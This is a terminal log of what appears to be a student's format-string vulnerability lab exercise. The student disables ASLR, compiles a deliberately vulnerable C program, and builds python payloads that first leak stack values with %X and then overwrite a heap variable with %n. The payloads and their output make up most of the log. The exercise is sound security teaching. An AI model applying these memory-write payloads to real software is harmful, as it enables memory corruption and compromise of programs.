# practice log

[02/13/2015 23:27] seed@ubuntu:~/Desktop/format_string_vulnerability$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0

[02/13/2015 23:28] seed@ubuntu:~/Desktop/format_string_vulnerability$ gcc vul_prog.c -o vul -fno-stack-protector
vul_prog.c: In function ‘main’:
vul_prog.c:22:17: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘int **’ [-Wformat]
vul_prog.c:24:17: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘int *’ [-Wformat]
vul_prog.c:26:17: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘int *’ [-Wformat]
vul_prog.c:28:17: warning: format ‘%x’ expects argument of type ‘unsigned int’, but argument 2 has type ‘int *’ [-Wformat]
vul_prog.c:36:5: warning: format not a string literal and no format arguments [-Wformat-security]

[02/13/2015 23:28] seed@ubuntu:~/Desktop/format_string_vulnerability$ python -c "print 'AAAA.%X.%X.%X.%X.%X.%X.%X.%X.%X'" > exploit.txt 

[02/14/2015 00:56] seed@ubuntu:~/Desktop/format_string_vulnerability$ ./vul < exploit.txt 
The variable secret's address is 0xbffff318 (on stack)
The variable secret's value is 0x 804b008 (on heap)
secret[0]'s address is 0x 804b008 (on heap)
secret[1]'s address is 0x 804b00c (on heap)
please enter a decimal integer
please enter a string
AAAA.BFFFF31C.0.B7FF3FEC.BFFFF3C4.0.804B008.41414141.2E58252E.252E5825
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55

[02/14/2015 00:56] seed@ubuntu:~/Desktop/format_string_vulnerability$ python -c "print '\x08\xb0\x04\x08.%X.%X.%X.%X.%X.%X.%n.%X.%X'" > exploit.txt 

[02/14/2015 00:57] seed@ubuntu:~/Desktop/format_string_vulnerability$ ./vul < exploit.txt 
The variable secret's address is 0xbffff318 (on stack)
The variable secret's value is 0x 804b008 (on heap)
secret[0]'s address is 0x 804b008 (on heap)
secret[1]'s address is 0x 804b00c (on heap)
please enter a decimal integer
please enter a string
�.BFFFF31C.0.B7FF3FEC.BFFFF3C4.0.804B008..2E58252E.252E5825
The original secrets: 0x44 -- 0x55
The new secrets:      0x2c -- 0x55

[02/14/2015 00:57] seed@ubuntu:~/Desktop/format_string_vulnerability$ python -c "print '\x08\xb0\x04\x08.%X.%X.%X.%X.%X.%8X.%n.%X.%X'" > exploit.txt 

[02/14/2015 00:57] seed@ubuntu:~/Desktop/format_string_vulnerability$ ./vul < exploit.txt 
The variable secret's address is 0xbffff318 (on stack)
The variable secret's value is 0x 804b008 (on heap)
secret[0]'s address is 0x 804b008 (on heap)
secret[1]'s address is 0x 804b00c (on heap)
please enter a decimal integer
please enter a string
�.BFFFF31C.0.B7FF3FEC.BFFFF3C4.0. 804B008..2E58252E.252E5825
The original secrets: 0x44 -- 0x55
The new secrets:      0x2d -- 0x55

[02/14/2015 00:57] seed@ubuntu:~/Desktop/format_string_vulnerability$ python -c "print '\x08\xb0\x04\x08.%X.%X.%X.%X.%X.%72X.%n.%X.%X'" > exploit.txt 

[02/14/2015 00:59] seed@ubuntu:~/Desktop/format_string_vulnerability$ ./vul < exploit.txt 
The variable secret's address is 0xbffff318 (on stack)
The variable secret's value is 0x 804b008 (on heap)
secret[0]'s address is 0x 804b008 (on heap)
secret[1]'s address is 0x 804b00c (on heap)
please enter a decimal integer
please enter a string
�.BFFFF31C.0.B7FF3FEC.BFFFF3C4.0.                                                                 804B008..2E58252E.252E5825
The original secrets: 0x44 -- 0x55
The new secrets:      0x6d -- 0x55

[02/14/2015 00:59] seed@ubuntu:~/Desktop/format_string_vulnerability$ python -c "print '\x08\xb0\x04\x08.%X.%X.%X.%X.%X.%114X.%n.%X.%X'" > exploit.txt 

[02/14/2015 01:00] seed@ubuntu:~/Desktop/format_string_vulnerability$ ./vul < exploit.txt 
The variable secret's address is 0xbffff318 (on stack)
The variable secret's value is 0x 804b008 (on heap)
secret[0]'s address is 0x 804b008 (on heap)
secret[1]'s address is 0x 804b00c (on heap)
please enter a decimal integer
please enter a string
�.BFFFF31C.0.B7FF3FEC.BFFFF3C4.0.                                                                                                           804B008..2E58252E.252E5825
The original secrets: 0x44 -- 0x55
The new secrets:      0x97 -- 0x55



